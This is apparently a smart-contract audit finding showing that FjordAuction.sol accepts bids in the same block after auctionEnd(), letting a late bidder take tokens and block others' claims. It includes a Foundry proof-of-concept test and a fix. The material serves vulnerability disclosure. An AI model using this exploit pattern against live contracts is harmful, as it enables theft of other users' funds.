# [M-01] User can call FjordAuction.sol::bid() within the same block after FjordAuction.sol::auctionEnd() has been called

## Summary

User can bid after the auction ends which can happen if the auction ends within the same block and the user also bids within the same block, since the block shares the same timestamp. This way the calculated multiplier will not be affected after the bid.

## Vulnerability Details

Auction can be ended if the timestamps are equal.
https://github.com/Cyfrin/2024-08-fjord/blob/0312fa9dca29fa7ed9fc432fdcd05545b736575d/src/FjordAuction.sol#L182-#L184

Then we can go and bid within the same block that the auction has ended.
https://github.com/Cyfrin/2024-08-fjord/blob/0312fa9dca29fa7ed9fc432fdcd05545b736575d/src/FjordAuction.sol#L144-#L146

The user can use the multiplier in their favor.
The user can also claim their tokens and creating a DoS for the other users, since there won't be enough tokens at the end to be sent/claimed.

Example scenario:
TotalTokens: `100`.

Bob bids `10`.
Alice bids `10`.

Total bids: `20`.
Multiplier is: `100.mul(1e18).div(20)` = `5000000000000000000`
So the tokens are calculated to be `evenly` distributed among 2 users.

Exploiter also bids `10` after the auction ends.
Then the exploiter goes and claims his reward leaving `100 - 50 = 50` tokens in the contract.

Bob claims his tokens ,leaving `50 - 50 = 0` tokens in the contract.

Alice share is `50 tokens`, but there are `0 tokens` left in the contract. This results in a DoS and Alice can't claim her tokens.

<details> 
<summary>PoC</summary>

Place the following inside the `test/mocks/ERC20BurnableMock.sol`:

Run the test `forge test --mt testBidWhenAuctionEnd`

```solidity
constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
    _mint(msg.sender, 1000000 ether);
}
```

Add the following test inside the `test/unit/auction.t.sol`:

```solidity
function approveAndBid(address user, uint256 amount) public {
    deal(address(fjordPoints), user, amount);
    vm.startPrank(user);
    fjordPoints.approve(address(auction), amount);
    auction.bid(amount);
    vm.stopPrank();
}

function testBidWhenAuctionEnd() public {
    address regularUser1 = address(0x2);
    address regularUser2 = address(0x3);
    address exploiter = address(0x4);

    uint256 bidRegularUser1 = 15 ether;
    uint256 bidRegularUser2 = 35 ether;
    uint256 normalTotalBids = bidRegularUser1 + bidRegularUser2;

    uint256 bidExploiter = 10 ether;

    approveAndBid(regularUser1, bidRegularUser1);
    approveAndBid(regularUser2, bidRegularUser2);

    skip(biddingTime);
    auction.auctionEnd();

    // making sure the auction has ended.
    assertEq(auction.ended(), true);

    // should not be able to bid after the auction ends - START
    approveAndBid(exploiter, bidExploiter);
    // should not be able to bid after the auction ends - END

    // only two normal bidders has bidded the normal way. That is why we use `normalTotalBids`
    // we cannot use auction.totalBids(), since the exploiter has increased it after the auction ended.
    uint256 multiplier = totalTokens.mul(1e18).div(normalTotalBids);
    assertEq(auction.multiplier(), multiplier);

    // Check if there are tokens after the auctionEnd is called.
    // means that we managed to bid after the auction has ended.
    assert(fjordPoints.balanceOf(address(auction)) > 0);

    uint256 exploiterReward = auction.bids(exploiter).mul(multiplier).div(1e18);
    uint256 regularUserReward1 = auction.bids(regularUser1).mul(multiplier).div(1e18);
    uint256 regularUserReward2 = auction.bids(regularUser2).mul(multiplier).div(1e18);

    console.log("exploiter reward: ", exploiterReward);
    console.log("regularUser1 reward: ", regularUserReward1);
    console.log("regularUser2 reward: ", regularUserReward2);
    console.log("multiplier: ", multiplier);

    // try to claim tokens
    vm.prank(exploiter);
    auction.claimTokens();

    // someone wont be able to claim his tokens, creating a DoS
    // in this case it would be the last person. In other case it could be the second person
    vm.prank(regularUser1);
    auction.claimTokens();

    vm.expectRevert("ERC20: transfer amount exceeds balance");
    vm.prank(regularUser2);
    auction.claimTokens();
}
```

</details>

## Impact

The malicious user can bid after the auction ends. This will create a DoS for the regular users that will try to claim their tokens.
This could happen intentionally and also unintentionally.

## Tools Used

Manual Review
Foundry

Recommendations
Add `ended` check for unbid and bid functions.

<details> 
<summary>Diff</summary>

```diff
function bid(uint256 amount) external {
+   if (ended) {
+       revert AuctionEndAlreadyCalled();
+   }

    if (block.timestamp > auctionEndTime) {
        revert AuctionAlreadyEnded();
    }

    bids[msg.sender] = bids[msg.sender].add(amount);
    totalBids = totalBids.add(amount);

    fjordPoints.transferFrom(msg.sender, address(this), amount);
    emit BidAdded(msg.sender, amount);
}


function unbid(uint256 amount) external {
+   if (ended) {
+       revert AuctionEndAlreadyCalled();
+   }

    if (block.timestamp > auctionEndTime) {
        revert AuctionAlreadyEnded();
    }

    uint256 userBids = bids[msg.sender];
    if (userBids == 0) {
        revert NoBidsToWithdraw();
    }
    if (amount > userBids) {
        revert InvalidUnbidAmount();
    }

    bids[msg.sender] = bids[msg.sender].sub(amount);
    totalBids = totalBids.sub(amount);
    fjordPoints.transfer(msg.sender, amount);
    emit BidWithdrawn(msg.sender, amount);
}

```

</details>
